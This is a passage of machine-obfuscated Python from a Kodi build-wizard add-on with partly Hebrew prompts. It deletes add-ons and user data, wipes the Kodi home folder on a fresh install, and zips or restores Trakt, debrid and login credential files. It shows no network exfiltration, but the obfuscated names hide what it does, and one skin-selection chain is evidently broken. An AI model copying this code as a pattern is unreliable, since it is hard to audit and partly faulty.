		O0O0OO000OOOO0000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O000OOOOO00OO0 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O00000O00O00O0OO0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4602
	if O0O0OO000OOOO0000 ==1 :#line:4603
		O0OOOO0O00OO0O0OO =os .path .join (ADDONS ,O00000O00O00O0OO0 )#line:4604
		wiz .log ("Removing Addon %s"%O00000O00O00O0OO0 )#line:4605
		wiz .cleanHouse (O0OOOO0O00OO0O0OO )#line:4606
		xbmc .sleep (1000 )#line:4607
		try :shutil .rmtree (O0OOOO0O00OO0O0OO )#line:4608
		except Exception as O00O0OO0O0OO00O0O :wiz .log ("Error removing %s"%O00000O00O00O0OO0 ,xbmc .LOGNOTICE )#line:4609
		removeAddonData (O00000O00O00O0OO0 ,O00O000OOOOO00OO0 ,over )#line:4610
	if over ==False :#line:4611
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O00O000OOOOO00OO0 ))#line:4612
def removeAddonData (OOO00OO00000OO0O0 ,name =None ,over =False ):#line:4614
	if OOO00OO00000OO0O0 =='all':#line:4615
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4616
			wiz .cleanHouse (ADDOND )#line:4617
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4618
	elif OOO00OO00000OO0O0 =='uninstalled':#line:4619
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4620
			OOO0000O0OO0OOO00 =0 #line:4621
			for OO0000OOO000OO000 in glob .glob (os .path .join (ADDOND ,'*')):#line:4622
				OO0O0OO0O0OOO0000 =OO0000OOO000OO000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4623
				if OO0O0OO0O0OOO0000 in EXCLUDES :pass #line:4624
				elif os .path .exists (os .path .join (ADDONS ,OO0O0OO0O0OOO0000 )):pass #line:4625
				else :wiz .cleanHouse (OO0000OOO000OO000 );OOO0000O0OO0OOO00 +=1 ;wiz .log (OO0000OOO000OO000 );shutil .rmtree (OO0000OOO000OO000 )#line:4626
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOO0000O0OO0OOO00 ))#line:4627
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4628
	elif OOO00OO00000OO0O0 =='empty':#line:4629
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4630
			OOO0000O0OO0OOO00 =wiz .emptyfolder (ADDOND )#line:4631
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOO0000O0OO0OOO00 ))#line:4632
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4633
	else :#line:4634
		O0000O0000OO0O0OO =os .path .join (USERDATA ,'addon_data',OOO00OO00000OO0O0 )#line:4635
		if OOO00OO00000OO0O0 in EXCLUDES :#line:4636
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4637
		elif os .path .exists (O0000O0000OO0O0OO ):#line:4638
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO00OO00000OO0O0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4639
				wiz .cleanHouse (O0000O0000OO0O0OO )#line:4640
				try :#line:4641
					shutil .rmtree (O0000O0000OO0O0OO )#line:4642
				except :#line:4643
					wiz .log ("Error deleting: %s"%O0000O0000OO0O0OO )#line:4644
			else :#line:4645
				wiz .log ('Addon data for %s was not removed'%OOO00OO00000OO0O0 )#line:4646
	wiz .refresh ()#line:4647
def restoreit (O0O0O0OO0O000000O ):#line:4649
	if O0O0O0OO0O000000O =='build':#line:4650
		OO0OOOOO00000000O =freshStart ('restore')#line:4651
		if OO0OOOOO00000000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4652
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4653
		wiz .skinToDefault ()#line:4654
	wiz .restoreLocal (O0O0O0OO0O000000O )#line:4655
def restoreextit (O0000O0O000O00OO0 ):#line:4657
	if O0000O0O000O00OO0 =='build':#line:4658
		OOOO0000O000OOOO0 =freshStart ('restore')#line:4659
		if OOOO0000O000OOOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4660
	wiz .restoreExternal (O0000O0O000O00OO0 )#line:4661
def buildInfo (OOOO00OO0000OO000 ):#line:4663
	if wiz .workingURL (SPEEDFILE )==True :#line:4664
		if wiz .checkBuild (OOOO00OO0000OO000 ,'url'):#line:4665
			OOOO00OO0000OO000 ,O0O00OOO000O00O00 ,O0O0O000OO00OO0OO ,O000OOO0000O0O000 ,OOO0OOO00OO0O0O0O ,O0O0OOO0OOOOO0OO0 ,OO0O0O00OOO0OO0O0 ,O0000O000O00OO0O0 ,OOOO0O00OOO0O00OO ,OOOOO000000O00OOO ,O000O0O0OO0OO0O00 =wiz .checkBuild (OOOO00OO0000OO000 ,'all')#line:4666
			OOOOO000000O00OOO ='Yes'if OOOOO000000O00OOO .lower ()=='yes'else 'No'#line:4667
			O0O00O0OO000OO0O0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO00OO0000OO000 )#line:4668
			O0O00O0OO000OO0O0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00OOO000O00O00 )#line:4669
			if not O0O0OOO0OOOOO0OO0 =="http://":#line:4670
				O000O0O0O0OO0O000 =wiz .themeCount (OOOO00OO0000OO000 ,False )#line:4671
				O0O00O0OO000OO0O0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O000O0O0O0OO0O000 ))#line:4672
			O0O00O0OO000OO0O0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0OOO00OO0O0O0O )#line:4673
			O0O00O0OO000OO0O0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOO000000O00OOO )#line:4674
			O0O00O0OO000OO0O0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000O0O0OO0OO0O00 )#line:4675
			wiz .TextBox (ADDONTITLE ,O0O00O0OO000OO0O0 )#line:4676
		else :wiz .log ("Invalid Build Name!")#line:4677
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4678
def buildVideo (OOOOOO00OOO0000OO ):#line:4680
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4681
	if wiz .workingURL (SPEEDFILE )==True :#line:4682
		OOO00OOO00OO0000O =wiz .checkBuild (OOOOOO00OOO0000OO ,'preview')#line:4683
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOOOOO00OOO0000OO )#line:4684
		if OOO00OOO00OO0000O and not OOO00OOO00OO0000O =='http://':playVideo (OOO00OOO00OO0000O )#line:4685
		else :wiz .log ("[%s]Unable to find url for video preview"%OOOOOO00OOO0000OO )#line:4686
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4687
def dependsList (OOOOOOO0O000O0O0O ):#line:4689
	OO00000OOO00OOO00 =os .path .join (ADDONS ,OOOOOOO0O000O0O0O ,'addon.xml')#line:4690
	if os .path .exists (OO00000OOO00OOO00 ):#line:4691
		OOO0OO00OOO00O000 =open (OO00000OOO00OOO00 ,mode ='r');OO0O0OO000OOO0OO0 =OOO0OO00OOO00O000 .read ();OOO0OO00OOO00O000 .close ();#line:4692
		OO0O0O000OOO00OO0 =wiz .parseDOM (OO0O0OO000OOO0OO0 ,'import',ret ='addon')#line:4693
		OOO0O0O0O0OOO0000 =[]#line:4694
		for O0OO0OOO0O0O00O00 in OO0O0O000OOO00OO0 :#line:4695
			if not 'xbmc.python'in O0OO0OOO0O0O00O00 :#line:4696
				OOO0O0O0O0OOO0000 .append (O0OO0OOO0O0O00O00 )#line:4697
		return OOO0O0O0O0OOO0000 #line:4698
	return []#line:4699
def manageSaveData (O0OOOOOO0OO0000OO ):#line:4701
	if O0OOOOOO0OO0000OO =='import':#line:4702
		O00O000000000O0OO =os .path .join (ADDONDATA ,'temp')#line:4703
		if not os .path .exists (O00O000000000O0OO ):os .makedirs (O00O000000000O0OO )#line:4704
		OOO00OO0OO00OO0O0 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4705
		if not OOO00OO0OO00OO0O0 .endswith ('.zip'):#line:4706
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4707
			return #line:4708
		O0OOOO0OO0O0O000O =os .path .join (MYBUILDS ,'SaveData.zip')#line:4709
		OO00OO0O000O0O0OO =xbmcvfs .copy (OOO00OO0OO00OO0O0 ,O0OOOO0OO0O0O000O )#line:4710
		wiz .log ("%s"%str (OO00OO0O000O0O0OO ))#line:4711
		extract .all (xbmc .translatePath (O0OOOO0OO0O0O000O ),O00O000000000O0OO )#line:4712
		OOOOOOOO00OO0000O =os .path .join (O00O000000000O0OO ,'trakt')#line:4713
		OOOOOOO0OOO0OO0OO =os .path .join (O00O000000000O0OO ,'login')#line:4714
		OO0OO00OO00OOO0O0 =os .path .join (O00O000000000O0OO ,'debrid')#line:4715
		OOOO00OOO0OO0O000 =0 #line:4716
		if os .path .exists (OOOOOOOO00OO0000O ):#line:4717
			OOOO00OOO0OO0O000 +=1 #line:4718
			OO0OO0000OO0OO0O0 =os .listdir (OOOOOOOO00OO0000O )#line:4719
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4720
			for O0OOOO0000OO00O0O in OO0OO0000OO0OO0O0 :#line:4721
				OOO00OO0O0O0O0O00 =os .path .join (traktit .TRAKTFOLD ,O0OOOO0000OO00O0O )#line:4722
				O0000O0OO0OOO00O0 =os .path .join (OOOOOOOO00OO0000O ,O0OOOO0000OO00O0O )#line:4723
				if os .path .exists (OOO00OO0O0O0O0O00 ):#line:4724
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OOOO0000OO00O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4725
					else :os .remove (OOO00OO0O0O0O0O00 )#line:4726
				shutil .copy (O0000O0OO0OOO00O0 ,OOO00OO0O0O0O0O00 )#line:4727
			traktit .importlist ('all')#line:4728
			traktit .traktIt ('restore','all')#line:4729
		if os .path .exists (OOOOOOO0OOO0OO0OO ):#line:4730
			OOOO00OOO0OO0O000 +=1 #line:4731
			OO0OO0000OO0OO0O0 =os .listdir (OOOOOOO0OOO0OO0OO )#line:4732
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4733
			for O0OOOO0000OO00O0O in OO0OO0000OO0OO0O0 :#line:4734
				OOO00OO0O0O0O0O00 =os .path .join (loginit .LOGINFOLD ,O0OOOO0000OO00O0O )#line:4735
				O0000O0OO0OOO00O0 =os .path .join (OOOOOOO0OOO0OO0OO ,O0OOOO0000OO00O0O )#line:4736
				if os .path .exists (OOO00OO0O0O0O0O00 ):#line:4737
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OOOO0000OO00O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4738
					else :os .remove (OOO00OO0O0O0O0O00 )#line:4739
				shutil .copy (O0000O0OO0OOO00O0 ,OOO00OO0O0O0O0O00 )#line:4740
			loginit .importlist ('all')#line:4741
			loginit .loginIt ('restore','all')#line:4742
		if os .path .exists (OO0OO00OO00OOO0O0 ):#line:4743
			OOOO00OOO0OO0O000 +=1 #line:4744
			OO0OO0000OO0OO0O0 =os .listdir (OO0OO00OO00OOO0O0 )#line:4745
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4746
			for O0OOOO0000OO00O0O in OO0OO0000OO0OO0O0 :#line:4747
				OOO00OO0O0O0O0O00 =os .path .join (debridit .REALFOLD ,O0OOOO0000OO00O0O )#line:4748
				O0000O0OO0OOO00O0 =os .path .join (OO0OO00OO00OOO0O0 ,O0OOOO0000OO00O0O )#line:4749
				if os .path .exists (OOO00OO0O0O0O0O00 ):#line:4750
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OOOO0000OO00O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4751
					else :os .remove (OOO00OO0O0O0O0O00 )#line:4752
				shutil .copy (O0000O0OO0OOO00O0 ,OOO00OO0O0O0O0O00 )#line:4753
			debridit .importlist ('all')#line:4754
			debridit .debridIt ('restore','all')#line:4755
		wiz .cleanHouse (O00O000000000O0OO )#line:4756
		wiz .removeFolder (O00O000000000O0OO )#line:4757
		os .remove (O0OOOO0OO0O0O000O )#line:4758
		if OOOO00OOO0OO0O000 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4759
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4760
	elif O0OOOOOO0OO0000OO =='export':#line:4761
		O00O0O00OO0O00000 =xbmc .translatePath (MYBUILDS )#line:4762
		O00000000O00OOOO0 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4763
		traktit .traktIt ('update','all')#line:4764
		loginit .loginIt ('update','all')#line:4765
		debridit .debridIt ('update','all')#line:4766
		OOO00OO0OO00OO0O0 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4767
		OOO00OO0OO00OO0O0 =xbmc .translatePath (OOO00OO0OO00OO0O0 )#line:4768
		O00O00OOOO00O0000 =os .path .join (O00O0O00OO0O00000 ,'SaveData.zip')#line:4769
		O000OO0OO00OO0O0O =zipfile .ZipFile (O00O00OOOO00O0000 ,mode ='w')#line:4770
		for OO000OO0O0000OO00 in O00000000O00OOOO0 :#line:4771
			if os .path .exists (OO000OO0O0000OO00 ):#line:4772
				OO0OO0000OO0OO0O0 =os .listdir (OO000OO0O0000OO00 )#line:4773
				for O00O0O0O0OO0OO00O in OO0OO0000OO0OO0O0 :#line:4774
					O000OO0OO00OO0O0O .write (os .path .join (OO000OO0O0000OO00 ,O00O0O0O0OO0OO00O ),os .path .join (OO000OO0O0000OO00 ,O00O0O0O0OO0OO00O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4775
		O000OO0OO00OO0O0O .close ()#line:4776
		if OOO00OO0OO00OO0O0 ==O00O0O00OO0O00000 :#line:4777
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O00OOOO00O0000 ))#line:4778
		else :#line:4779
			try :#line:4780
				xbmcvfs .copy (O00O00OOOO00O0000 ,os .path .join (OOO00OO0OO00OO0O0 ,'SaveData.zip'))#line:4781
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OOO00OO0OO00OO0O0 ,'SaveData.zip')))#line:4782
			except :#line:4783
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O00OOOO00O0000 ))#line:4784
def freshStart (install =None ,over =False ):#line:4789
	if USERNAME =='':#line:4790
		ADDON .openSettings ()#line:4791
		sys .exit ()#line:4792
	OO0O000OOOO0OO0OO =u_list (SPEEDFILE )#line:4793
	(OO0O000OOOO0OO0OO )#line:4794
	OOOOOOOO0OOOOO00O =(wiz .workingURL (OO0O000OOOO0OO0OO ))#line:4795
	(OOOOOOOO0OOOOO00O )#line:4796
	if KEEPTRAKT =='true':#line:4797
		traktit .autoUpdate ('all')#line:4798
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4799
	if KEEPREAL =='true':#line:4800
		debridit .autoUpdate ('all')#line:4801
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4802
	if KEEPLOGIN =='true':#line:4803
		loginit .autoUpdate ('all')#line:4804
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4805
	if over ==True :OO00O00OOO0OO0O0O =1 #line:4806
	elif install =='restore':OO00O00OOO0OO0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4807
	elif install :OO00O00OOO0OO0O0O =1 #line:4808
	else :OO00O00OOO0OO0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4809
	if OO00O00OOO0OO0O0O :#line:4810
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4811
			O000O000OO0OOO000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4812
			skinSwitch .swapSkins (O000O000OO0OOO000 )#line:4815
			OOO0OOOOOOO00O000 =0 #line:4816
			xbmc .sleep (1000 )#line:4817
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO0OOOOOOO00O000 <150 :#line:4818
				OOO0OOOOOOO00O000 +=1 #line:4819
				xbmc .sleep (1000 )#line:4820
				wiz .ebi ('SendAction(Select)')#line:4821
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4822
				wiz .ebi ('SendClick(11)')#line:4823
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4824
			xbmc .sleep (1000 )#line:4825
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4826
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4827
			return #line:4828
		wiz .addonUpdates ('set')#line:4829
		O0000OO0000OO00OO =os .path .abspath (HOME )#line:4830
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4831
		OO0OO00OO0O0O0O00 =sum ([len (OO0O00OO000OOO00O )for O00OOO0OOOOO0O000 ,OOOOOO0000O0O0OO0 ,OO0O00OO000OOO00O in os .walk (O0000OO0000OO00OO )]);O0O0O0OOOOOO0OOO0 =0 #line:4832
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4833
		EXCLUDES .append ('My_Builds')#line:4834
		EXCLUDES .append ('archive_cache')#line:4835
		EXCLUDES .append ('script.module.requests')#line:4836
		EXCLUDES .append ('myfav.anon')#line:4837
		if KEEPREPOS =='true':#line:4838
			OO000OO00OOO00OOO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4839
			for O000OO0O0000O0O00 in OO000OO00OOO00OOO :#line:4840
				O00O0OO0O0OO0O000 =os .path .split (O000OO0O0000O0O00 [:-1 ])[1 ]#line:4841
				if not O00O0OO0O0OO0O000 ==EXCLUDES :#line:4842
					EXCLUDES .append (O00O0OO0O0OO0O000 )#line:4843
		if KEEPSUPER =='true':#line:4844
			EXCLUDES .append ('plugin.program.super.favourites')#line:4845
		if KEEPMOVIELIST =='true':#line:4846
			EXCLUDES .append ('plugin.video.metalliq')#line:4847
		if KEEPMOVIELIST =='true':#line:4848
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4849
		if KEEPADDONS =='true':#line:4850
			EXCLUDES .append ('addons')#line:4851
		if KEEPADDONS =='true':#line:4852
			EXCLUDES .append ('addon_data')#line:4853
		EXCLUDES .append ('plugin.video.elementum')#line:4856
		EXCLUDES .append ('script.elementum.burst')#line:4857
		EXCLUDES .append ('script.elementum.burst-master')#line:4858
		EXCLUDES .append ('plugin.video.quasar')#line:4859
		EXCLUDES .append ('script.quasar.burst')#line:4860
		EXCLUDES .append ('skin.estuary')#line:4861
		if KEEPWHITELIST =='true':#line:4864
			O0O0O0OO0O00O000O =''#line:4865
			O00OO00OOOO0O0OOO =wiz .whiteList ('read')#line:4866
			if len (O00OO00OOOO0O0OOO )>0 :#line:4867
				for O000OO0O0000O0O00 in O00OO00OOOO0O0OOO :#line:4868
					try :OO0OOOO0O00OO0OO0 ,OOO0O00O00000OOO0 ,O00OOO000O0OO00O0 =O000OO0O0000O0O00 #line:4869
					except :pass #line:4870
					if O00OOO000O0OO00O0 .startswith ('pvr'):O0O0O0OO0O00O000O =OOO0O00O00000OOO0 #line:4871
					O0O0OOOOOO0O0000O =dependsList (O00OOO000O0OO00O0 )#line:4872
					for OOOOO00OO0O0000OO in O0O0OOOOOO0O0000O :#line:4873
						if not OOOOO00OO0O0000OO in EXCLUDES :#line:4874
							EXCLUDES .append (OOOOO00OO0O0000OO )#line:4875
						O0O0O000O00O0O0O0 =dependsList (OOOOO00OO0O0000OO )#line:4876
						for OO0OO00000OO0O0O0 in O0O0O000O00O0O0O0 :#line:4877
							if not OO0OO00000OO0O0O0 in EXCLUDES :#line:4878
								EXCLUDES .append (OO0OO00000OO0O0O0 )#line:4879
					if not O00OOO000O0OO00O0 in EXCLUDES :#line:4880
						EXCLUDES .append (O00OOO000O0OO00O0 )#line:4881
				if not O0O0O0OO0O00O000O =='':wiz .setS ('pvrclient',O00OOO000O0OO00O0 )#line:4882
		if wiz .getS ('pvrclient')=='':#line:4883
			for O000OO0O0000O0O00 in EXCLUDES :#line:4884
				if O000OO0O0000O0O00 .startswith ('pvr'):#line:4885
					wiz .setS ('pvrclient',O000OO0O0000O0O00 )#line:4886
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4887
		O00OOO0OO00OOOOO0 =wiz .latestDB ('Addons')#line:4888
		for O000O0OO0O0OO0O0O ,O0OOO0OO0O0O0O0O0 ,O0OO00O00000000O0 in os .walk (O0000OO0000OO00OO ,topdown =True ):#line:4889
			O0OOO0OO0O0O0O0O0 [:]=[O0OO0OOOO0000OO0O for O0OO0OOOO0000OO0O in O0OOO0OO0O0O0O0O0 if O0OO0OOOO0000OO0O not in EXCLUDES ]#line:4890
			for OO0OOOO0O00OO0OO0 in O0OO00O00000000O0 :#line:4891
				O0O0O0OOOOOO0OOO0 +=1 #line:4892
				O00OOO000O0OO00O0 =O000O0OO0O0OO0O0O .replace ('/','\\').split ('\\')#line:4893
				OOO0OOOOOOO00O000 =len (O00OOO000O0OO00O0 )-1 #line:4895
				if O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -2 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='addon_data'and 'script.skinshortcuts'in O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4896
				elif OO0OOOO0O00OO0OO0 =='MyVideos99.db'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4897
				elif OO0OOOO0O00OO0OO0 =='MyVideos107.db'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4898
				elif OO0OOOO0O00OO0OO0 =='MyVideos116.db'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4899
				elif OO0OOOO0O00OO0OO0 =='MyVideos99.db'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4900
				elif OO0OOOO0O00OO0OO0 =='MyVideos107.db'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4901
				elif OO0OOOO0O00OO0OO0 =='MyVideos116.db'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -1 ]=='userdata'and O00OOO000O0OO00O0 [OOO0OOOOOOO00O000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O000O0OO0O0OO0O0O ,OO0OOOO0O00OO0OO0 ),xbmc .LOGNOTICE )#line:4902
